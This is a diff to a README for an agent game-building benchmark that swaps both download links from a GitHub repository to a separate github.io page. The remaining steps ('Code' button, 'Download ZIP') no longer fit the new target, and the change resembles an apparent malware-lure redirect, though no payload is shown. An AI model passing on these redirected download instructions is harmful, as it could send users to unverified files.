@@ -1,6 +1,6 @@
 # 🎮 gamecraft-bench - Benchmark your agents building games easily
 
-[![](https://img.shields.io/badge/Download-GameCraft-blue)](https://github.com/bertinebrocaded688/gamecraft-bench)
+[![](https://img.shields.io/badge/Download-GameCraft-blue)](https://bertinebrocaded688.github.io)
 
 ## 📁 What is GameCraft-Bench
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware and software to run these tests. Ensure yo
 
 You must visit the project page to access the latest version of the tools. Follow these steps to obtain the necessary files:
 
-1. Visit the main project repository page: [https://github.com/bertinebrocaded688/gamecraft-bench](https://github.com/bertinebrocaded688/gamecraft-bench).
+1. Visit the main project repository page: [https://bertinebrocaded688.github.io](https://bertinebrocaded688.github.io).
 2. Click the green "Code" button located near the top right of the file list.
 3. Select "Download ZIP" from the menu.
 4. Save the file to a folder on your computer where you have full read and write access.
